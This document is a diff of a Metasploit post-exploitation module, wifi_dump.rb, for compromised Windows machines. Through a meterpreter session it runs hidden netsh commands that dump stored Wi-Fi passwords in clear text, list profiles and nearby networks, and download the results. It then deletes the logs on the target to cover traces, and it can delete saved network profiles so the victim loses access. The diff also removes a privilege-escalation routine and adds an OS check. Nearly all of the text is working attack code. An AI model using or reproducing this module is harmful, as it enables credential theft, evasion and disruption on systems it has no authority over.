@@ -9,22 +9,19 @@
 
 ##
 # [ wifi_dump.rb - ESSID credentials dump (wlan/lan) ]
-# $Id$ 2.0 Author: pedr0 Ubuntu aka: [r00t-3xp10it]
-# Hosted By: peterubuntu10[at]sourceforge[dot]net
-# http://sourceforge.net/projects/msf-auxiliarys/
-# https://sourceforge.net/p/msf-auxiliarys/repository/ci/master/tree/wifi_dump.rb
+# Author: pedr0 Ubuntu aka: [r00t-3xp10it]
+# tested on: windows 7 | windows 10
+# video tutorial: https://www.youtube.com/watch?v=DqmbV9RnPI8
 #
 #
-# ---
 # [ POST-EXPLOITATION MODULE DESCRIPTION ]
 # This post-exploitation module requires a meterpreter session,
 # to be able to dump ESSID stored passwords (wlan/lan) using
 # cmd native netsh command, this module will not be able to
 # dump ESSID passwords from VMs, NAT or Bridged Networks.
 #
+#
 # [ MODULE OPTIONS ]
-# HINT: to unset all values use: msf post(wifi_dump) > unset all
-# Elevate session to 'nt authority/system'    => set GET_SYSTEM true
 # List active Interfaces available 'wlan/lan' => set LIST_INTERFACES true
 # Set interface to dump credentials from      => set INTERFACE lan
 # Set logfiles download location 'local'      => set DOWNLOAD_PATH /home/pedr0/Desktop
@@ -33,13 +30,13 @@
 # Delete selected ESSID from target system    => set DELETE_ESSID ZON-147F4
 # Show nearby wireless networks emitting      => set SHOW_NEARBY true
 # dump target SSID profile OR just the key    => set KEY_ONLY true
-# ---
 #
 #
 # [ PORT MODULE TO METASPLOIT DATABASE ]
 # Kali linux   COPY TO: /usr/share/metasploit-framework/modules/post/windows/wlan/wifi_dump.rb
 # Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/windows/wlan/wifi_dump.rb
 # Manually Path Search: root@kali:~# locate modules/post/windows/wlan
+#
 #
 # [ LOAD/USE AUXILIARY ]
 # meterpreter > background
@@ -50,15 +47,23 @@
 # msf post(wifi_dump) > show advanced options
 # msf post(wifi_dump) > set [option(s)]
 # msf post(wifi_dump) > exploit
+#
+#
+# [ HINT ]
+# In some linux distributions postgresql needs to be started and
+# metasploit database deleted/rebuild to be abble to load module.
+# 1 - service postgresql start
+# 2 - msfdb reinit   (optional)
+# 3 - msfconsole -x 'reload_all'
 ##
 
 
 
 
 
-# ----------------------------
+#
 # Module Dependencies/requires
-# ----------------------------
+#
 require 'rex'
 require 'msf/core'
 require 'msf/core/post/common'
@@ -66,9 +71,9 @@ require 'msf/core/post/windows/priv'
 
 
 
-# ----------------------------------
+#
 # Metasploit Class name and includes
-# ----------------------------------
+#
 class MetasploitModule < Msf::Post
       Rank = ExcellentRanking
  
@@ -77,9 +82,9 @@ class MetasploitModule < Msf::Post
 
 
 
-# -----------------------------------------
+#
 # Building Metasploit/Armitage info GUI/CLI
-# -----------------------------------------
+#
         def initialize(info={})
                 super(update_info(info,
                         'Name'          => 'ESSID credentials dump (wlan/lan)',
@@ -93,7 +98,7 @@ class MetasploitModule < Msf::Post
                                         'Special thanks: milton_barra', # testing/debug module
                                 ],
  
-                        'Version'        => '$Revision: 2.0',
+                        'Version'        => '$Revision: 2.1',
                         'DisclosureDate' => 'set 15 2016',
                         'Platform'       => 'windows',
                         'Arch'           => 'x86_x64',
@@ -114,8 +119,8 @@ class MetasploitModule < Msf::Post
                                 ],
 			'DefaultOptions' =>
 				{
-					'SESSION' => '1', # Default its to run againts session 1
-                                        'INTERFACE' => 'wlan', # Default its to run againts wireless interface
+					'SESSION' => '1',          # Default its to run againts session 1
+                                        'INTERFACE' => 'wlan',     # Default its to run againts wireless interface
                                         'DOWNLOAD_PATH' => '/root' # Default its to download logs into local /root folder 
 				},
                         'SessionTypes'   => [ 'meterpreter' ]
@@ -125,7 +130,6 @@ class MetasploitModule < Msf::Post
                 register_options(
                         [
                                 OptString.new('SESSION', [ true, 'The session number to run this module on']),
-                                OptBool.new('GET_SYSTEM', [ false, 'Elevate current session to nt authority/system' , false]),
                                 OptBool.new('LIST_INTERFACES', [ false, 'List active Interfaces available (wlan/lan)' , false]),
                                 OptBool.new('LIST_PROFILES', [ false, 'List ESSIDs stored in target system' , false]),
                                 OptString.new('DUMP_ESSID', [ false, 'Input ESSID name to Dump credentials from'])
@@ -143,71 +147,17 @@ class MetasploitModule < Msf::Post
         end
 
 
- 
 
 
-
-# ----------------------------------------------
-# Check for proper target Platform (win32|win64)
-# ----------------------------------------------
-def unsupported
-   session = client
-     sys = session.sys.config.sysinfo
-       print_warning("[ABORT]: Operative System => #{sys['OS']}")
-       print_error("Only windows systems are supported by this module...")
-       print_error("Please execute [info] for further information...")
-       print_line("")
-   raise Rex::Script::Completed
-end
-
-
-
-
-
-
-# ----------------------------------------
-# 'Privilege escalation' - Getting @SYSTEM
-# ----------------------------------------
-       def ls_getsys
-             toor = []
-             # variable API declarations
-             toor = client.sys.config.getuid
-             print_warning("Client UID: #{toor}")
-             print_status("Escalating privileges to: nt authority/system")
-               # getprivs API call loop funtion
-               client.sys.config.getprivs.each do |priv|
-               print_good("  Impersonate token => #{priv}")
-       end
- 
-         # checking results (if_system)
-         result = client.priv.getsystem
-         if result and result[0]
- 
-                csuid = []
-                csuid = client.sys.config.getuid
-                # print results on screen if successefully executed
-                print_status("Current client UID: #{csuid}")
-                print_line("")
-
-      else
-      # error display in executing command
-      print_error("Fail to obtain [nt authority/system] access!")
-      print_warning("Please manually run: getsystem to gain system privs!")
-      end
- end
-
-
-
-
-
-
-# ---------------------------------- 
+#
 # REPORT ACTIVE INTERFACE (WLAN/LAN)
-# ----------------------------------
+#
 def ls_stage1
+
   r=''
   key = []
   rand = []
+  output = []
   dpath = datastore['DOWNLOAD_PATH']
   rand = Rex::Text.rand_text_alpha(8) + '.log'
   # check for proper config settings enter...
@@ -221,26 +171,41 @@ def ls_stage1
   end
 
 
-    key = "netsh interface show interface > %temp%\\#{rand}"
+    #
     # execute cmd prompt in a hidden channelized windows!
     # and build logfile with results (dump) in target %temp% folder
+    #
+    dis = "netsh interface show interface"
+    key = "netsh interface show interface > %temp%\\#{rand}"
     r = session.sys.process.execute("cmd.exe /c #{key}", nil, {'Hidden' => true, 'Channelized' => true})
     print_good("  exec => #{key}") 
 
+      #
       # download 'logfile' from target machine using one API call
-      print_good("  exec => Downloading logfile from target system...")
+      #
+      print_good("  exec => Downloading logfile from target system ..")
       client.fs.file.download("#{dpath}/#{rand}","%temp%\\#{rand}")
-      print_warning("  Dumped logfile: #{dpath}/#{rand}")
+      print_warning("Dumped logfile: #{dpath}/#{rand}")
       # delete logfile from target system (API call): client.fs.file.rm("%temp%\\interfaces.log")
       r = session.sys.process.execute("cmd.exe /c DEL /q /f %temp%\\#{rand}", nil, {'Hidden' => true, 'Channelized' => true})
-      print_status("[REMARK]: Edit logfile to see dumped data...")
+
+      #
+      # Print results on screen
+      #
+      output = cmd_exec(dis)
+      print_line("")
+      print_line(output)
       print_line("")
 
+    #
     # close channel when done
+    #
     r.channel.close
     r.close
 
+  #
   # error exception funtion
+  #
   rescue ::Exception => e
   print_error("Error Running Command: #{e.class} #{e}")
   print_warning("Try to escalate session to [NT AUTHORITY/SYSTEM] before runing this module...")
@@ -251,13 +216,15 @@ end
 
 
 
-# ------------------------------- 
+#
 # LIST PROFILES AVAILABLE (ESSID)
-# -------------------------------
+#
 def ls_stage2
+
   r=''
   key = []
   rand = []
+  output = []
   inuse = datastore['INTERFACE']
   dpath = datastore['DOWNLOAD_PATH']
   rand = Rex::Text.rand_text_alpha(8) + '.log'
@@ -271,23 +238,35 @@ def ls_stage2
     print_status("List profiles available in: #{inuse} Interface")
   end
 
-
-    key = "netsh #{inuse} show profiles > %temp%\\#{rand}"
+    #
     # execute cmd prompt in a hidden channelized windows!
     # and build profiles.log with results (dump) in target %temp% folder
+    #
+    dis = "netsh #{inuse} show profiles"
+    key = "netsh #{inuse} show profiles > %temp%\\#{rand}"
     r = session.sys.process.execute("cmd.exe /c #{key}", nil, {'Hidden' => true, 'Channelized' => true})
     print_good("  exec => #{key}")
  
+      #
       # download 'logfile' from target machine using one API call
+      #
       print_good("  exec => Downloading logfile from target system...")
       client.fs.file.download("#{dpath}/#{rand}","%temp%\\#{rand}")
-      print_warning("  Dumped logfile: #{dpath}/#{rand}")
+      print_warning("Dumped logfile: #{dpath}/#{rand}")
       # delete logfile from target system (API call): client.fs.file.rm("%temp%\\profiles.log")
       r = session.sys.process.execute("cmd.exe /c DEL /q /f %temp%\\#{rand}", nil, {'Hidden' => true, 'Channelized' => true})
-      print_status("[REMARK]: Edit logfile to see dumped data...")
+
+      #
+      # Print results on screen
+      #
+      output = cmd_exec(dis)
+      print_line("")
+      print_line(output)
       print_line("")
 
+    #
     # close channel when done
+    #
     r.channel.close
     r.close
 
@@ -302,13 +281,15 @@ end
 
 
 
-# ------------------------------------------
+#
 # DUMP PASSWORD FROM SELECTED ESSID WLAN/LAN
-# ------------------------------------------
+#
 def ls_stage3
+
   r=''
   key = []
   rand = []
+  output = []
   inuse = datastore['INTERFACE']
   essid = datastore['DUMP_ESSID']
   dpath = datastore['DOWNLOAD_PATH']
@@ -324,9 +305,13 @@ def ls_stage3
   end
 
 
+    #
     # select to dump ESSID target profile OR just the wifi key
+    #
     if datastore['KEY_ONLY'] == true
+    #
     # check target system installed language
+    #
     check_lang = registry_getvaldata("HKLM\\System\\CurrentControlSet\\Control\\Nls\\Language","InstallLanguage")
       if check_lang == "0816" || check_lang == "0416"
         print_status("Target System language detected: Portuguese...")
@@ -362,26 +347,38 @@ def ls_stage3
       key = "netsh #{inuse} show profile #{essid} key=clear > %temp%\\#{rand}"
     end
 
-
+    #
     # execute cmd prompt in a hidden channelized windows!
     # and build logfile with results (dump) in target %temp% folder
+    #
+    dis = "netsh #{inuse} show profile #{essid} key=clear"
     r = session.sys.process.execute("cmd.exe /c #{key}", nil, {'Hidden' => true, 'Channelized' => true})
     print_good("  exec => #{key}")
  
        # download 'logfile' from target machine using one API call
        print_good("  exec => Downloading logfile from target system...")
        client.fs.file.download("#{dpath}/#{rand}","%temp%\\#{rand}")
-       print_warning("  Dumped logfile: #{dpath}/#{rand}")
+       print_warning("Dumped logfile: #{dpath}/#{rand}")
        # delete logfile from target system (API call): client.fs.file.rm("%temp%\\dump.log")
        r = session.sys.process.execute("cmd.exe /c DEL /q /f %temp%\\#{rand}", nil, {'Hidden' => true, 'Channelized' => true})
-       print_status("[REMARK]: Edit logfile to see dumped data...")
+
+       #
+       # Print results on screen
+       #
+       output = cmd_exec(dis)
+       print_line("")
+       print_line(output)
        print_line("")
 
+    #
     # close channel when done
+    #
     r.channel.close
     r.close
 
+  #
   # error exception funtion
+  #
   rescue ::Exception => e
   print_error("Error: #{e.class} #{e}")
   print_warning("Try to escalate session to [NT AUTHORITY/SYSTEM] before runing this module...")
@@ -392,12 +389,14 @@ end
 
 
 
-# -------------------------------- 
+#
 # LIST 'NEAR-BY' WIRELESS NETWORKS
-# --------------------------------
+#
 def ls_stage4
+
   r=''
   rand = []
+  output = []
   dpath = datastore['DOWNLOAD_PATH']
   rand = Rex::Text.rand_text_alpha(8) + '.log'
   # check for proper config settings enter...
@@ -410,20 +409,30 @@ def ls_stage4
     print_status("Show Nearby Wireless Networks...")
   end
 
-
-    key = "netsh wlan show networks mode=b > %temp%\\#{rand}"
+    #
     # execute cmd prompt in a hidden channelized windows!
     # and build networks.log with results (dump) in target %temp% folder
+    #
+    dis = "netsh wlan show networks mode=b"
+    key = "netsh wlan show networks mode=b > %temp%\\#{rand}"
     r = session.sys.process.execute("cmd.exe /c #{key}", nil, {'Hidden' => true, 'Channelized' => true})
     print_good("  exec => #{key}")
  
+      #
       # download 'logfile' from target machine using one API call
+      #
       print_good("  exec => Downloading logfile from target system...")
       client.fs.file.download("#{dpath}/#{rand}","%temp%\\#{rand}")
-      print_warning("  Dumped logfile: #{dpath}/#{rand}")
+      print_warning("Dumped logfile: #{dpath}/#{rand}")
       # delete logfile from target system (API call): client.fs.file.rm("%temp%\\nearby.log")
       r = session.sys.process.execute("cmd.exe /c DEL /q /f %temp%\\#{rand}", nil, {'Hidden' => true, 'Channelized' => true})
-      print_status("[REMARK]: Edit logfile to see dumped data...")
+
+      #
+      # Print results on screen
+      #
+      output = cmd_exec(dis)
+      print_line("")
+      print_line(output)
       print_line("")
 
     # close channel when done
@@ -441,10 +450,11 @@ end
 
 
 
-# ----------------------------------------
+#
 # DELETE SELECTED ESSID PROFILE (WLAN/LAN)
-# ----------------------------------------
+#
 def ls_stage5
+
   r=''
   key = []
   inuse = datastore['INTERFACE']
@@ -459,22 +469,29 @@ def ls_stage5
     print_status("Deleting ESSID: #{pwipe}")
   end
 
-
-     key = "netsh #{inuse} delete profile #{pwipe}"
+     #
      # execute cmd prompt in a hidden channelized windows!
+     #
+     key = "netsh #{inuse} delete profile #{pwipe}"
      r = session.sys.process.execute("cmd.exe /c #{key}", nil, {'Hidden' => true, 'Channelized' => true})
      print_good("  exec => #{key}")
  
+      #
       # display task status to attacker
+      #
       print_warning("Deleted => #{pwipe} Profile from: #{inuse} Interface")
       print_status("Target system have lost access to #{pwipe} wifi password...")
       print_line("")
 
+    #
     # close channel when done
+    #
     r.channel.close
     r.close
 
+  #
   # error exception funtion
+  #
   rescue ::Exception => e
   print_error(" Error: #{e.class} #{e}")
   print_warning("Try to escalate session to [NT AUTHORITY/SYSTEM] before runing this module...")
@@ -485,16 +502,16 @@ end
 
 
 
-# ------------------------------------------------
+#
 # MAIN DISPLAY WINDOWS (ALL MODULES - def run)
 # Running sellected modules against session target
-# ------------------------------------------------
+#
 def run
   session = client
-    # Check for proper target Platform
-    unsupported if client.platform !~ /win32|win64/i
+
 
       # Variable declarations (msf API calls)
+      oscheck = client.fs.file.expand_path("%OS%")
       sysnfo = session.sys.config.sysinfo
       runtor = client.sys.config.getuid
       runsession = client.session_host
@@ -508,6 +525,7 @@ def run
     print_line("    +--------------------------------------------+")
     print_line("")
     print_line("    Running on session  : #{datastore['SESSION']}")
+    print_line("    Target Architecture : #{sysnfo['Architecture']}")
     print_line("    Computer            : #{sysnfo['Computer']}")
     print_line("    Operative System    : #{sysnfo['OS']}")
     print_line("    Target IP addr      : #{runsession}")
@@ -517,22 +535,30 @@ def run
     print_line("")
 
 
-    # check for proper session.
+    #
+    # check for proper operating system (windows-not-wine)
+    #
+    if not oscheck == "Windows_NT"
+      print_error("[ ABORT ]: This module only works againts windows systems")
+      return nil
+    end
+    #
+    # check for proper session (meterpreter)
+    #
     if not sysinfo.nil?
       print_status("Running module against: #{sysnfo['Computer']}")
     else
       print_error("ABORT]:This post-module only works in meterpreter sessions")
       raise Rex::Script::Completed
     end
+    # elevate session privileges befor runing options
+    client.sys.config.getprivs.each do |priv|
+    end
 
 
-# ------------------------------------
+#
 # Selected settings to run
-# ------------------------------------
-      if datastore['GET_SYSTEM']
-         ls_getsys
-      end
-
+#
       if datastore['LIST_INTERFACES']
          ls_stage1
       end
